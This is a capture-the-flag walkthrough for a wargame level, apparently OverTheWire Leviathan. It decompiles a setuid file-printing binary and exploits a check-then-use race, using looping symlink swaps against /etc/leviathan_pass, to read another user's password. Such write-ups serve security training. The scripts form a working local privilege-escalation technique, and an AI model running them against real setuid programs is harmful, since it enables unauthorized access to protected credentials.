We will start by listing the contents of the home directory.
```bash
leviathan2@gibson:~$ ll
total 36
drwxr-xr-x  2 root       root        4096 Oct  5  2023 ./
drwxr-xr-x 83 root       root        4096 Oct  5  2023 ../
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Oct  5  2023 printfile*
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```
We can see an executable named `printfile`. Lets run it and see what happens.
```bash
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```
We need to give a file as argument. Since we know that all the passwords for leviathan are stored in `/etc/leviathan_pass` we should find the file called `leviathan3` and give it as an argument.
```bash
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```
As it seems we cant have this file. 
So let's just make a copy of this executable on our local machine by converting it first to base64.
```bash
leviathan2@gibson:~$ base64 printfile
```
Then paste the base64 characters on a file with `.base64` suffix and then decode it to binary with the name you want.
```bash
User@Github:~$ nano printfile.base64
User@Github:~$ base64 -d printfile.base64 > printfile
```
Now that we have the executable we can use [DogBolt](https://dogbolt.org/) to decompile the program and see what we need to do.

```C
//----- (080491E6) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v4; // ebx
  __uid_t v5; // eax
  const char **v6; // [esp+0h] [ebp-21Ch]
  char s[512]; // [esp+10h] [ebp-20Ch] BYREF
  unsigned int v8; // [esp+210h] [ebp-Ch]
  int *p_argc; // [esp+214h] [ebp-8h]

  p_argc = &argc;
  v6 = argv;
  v8 = __readgsdword(0x14u);
  if ( argc > 1 )
  {
    if ( access(argv[1], 4) )
    {
      puts("You cant have that file...");
      return 1;
    }
    else
    {
      snprintf(s, 0x1FFu, "/bin/cat %s", v6[1]);
      v4 = geteuid();
      v5 = geteuid();
      setreuid(v5, v4);
      system(s);
      return 0;
    }
  }
  else
  {
    puts("*** File Printer ***");
    printf("Usage: %s filename\n", *v6);
    return -1;
  }
}
```
This program prints the contents of a file specified by the user if the user has read access to it. If no file is specified, it prints usage instructions.
Lets navigate to the `/etc/leviathan_pass` path to see who can read the file `leviathan3`.
```bash
leviathan2@gibson:/etc/leviathan_pass$ ll
total 48
drwxr-xr-x   2 root       root        4096 Oct  5  2023 ./
drwxr-xr-x 109 root       root       12288 Oct  5  2023 ../
-r--------   1 leviathan0 leviathan0    11 Oct  5  2023 leviathan0
-r--------   1 leviathan1 leviathan1    11 Oct  5  2023 leviathan1
-r--------   1 leviathan2 leviathan2    11 Oct  5  2023 leviathan2
-r--------   1 leviathan3 leviathan3    11 Oct  5  2023 leviathan3
-r--------   1 leviathan4 leviathan4    11 Oct  5  2023 leviathan4
-r--------   1 leviathan5 leviathan5    11 Oct  5  2023 leviathan5
-r--------   1 leviathan6 leviathan6    11 Oct  5  2023 leviathan6
-r--------   1 leviathan7 leviathan7    11 Oct  5  2023 leviathan7
```
It seems only `leviathan3` has the right to read it. 
But since we have a file that uses the `/bin/cat` command we can exploit it. 
We will perform an attack called [TOCTTOU] attack or Race Condition timing attack. 
In a TOCTTOU attack, an attacker exploits the timing and order of events to gain unauthorized access to a resource or execute unintended operations. These attacks take advantage of a time differential between when a resource is checked (for example, to see if it is available) and the time when it is used.
We need 2 terminals for this to work.
On the first terminal we will execute the `printfile` indefinetely and will filter any error messages and on the second terminal we will make a symbolic link to the real `leviathan3` in the temp directory we made, then remove it, then make a regular file named `leviathan3` and then remove the regular file.
Lets start by creating the temp directory and giving it read write permissions.
```bash
leviathan2@gibson:~$ cd $(mktemp -d)
leviathan2@gibson:/tmp/tmp.uNKevxoo8G$ chmod 755 .
```
And now we run a while loop executing the `printfile`.
```bash
while true; do /home/leviathan2/printfile $(pwd)/leviathan3 2>&1 | egrep -v "You cant have that file...|/bin/cat: /tmp/tmp.uNKevxoo8G/leviathan3: No such file or directory" ; done
```
Now to our second terminal: We navigate on the directory of the first terminal:
```bash
leviathan2@gibson:~$ cd /tmp/tmp.uNKevxoo8G
```
And run a while loop that will make the symbolic link to the real `leviathan3` in the temp directory we made, then remove it, then make a regular file named `leviathan3` and then remove the regular file.
```bash
leviathan2@gibson:/tmp/tmp.uNKevxoo8G$ while true; do ln -sf /etc/leviathan_pass/leviathan3 leviathan3; rm -f leviathan3
; touch leviathan3; rm leviathan3; done
```
And now the output of our first terminal should be:
```
Q0G8j.....
Q0G8j.....
Q0G8j.....
Q0G8j.....
```
Thats our password for the next level!
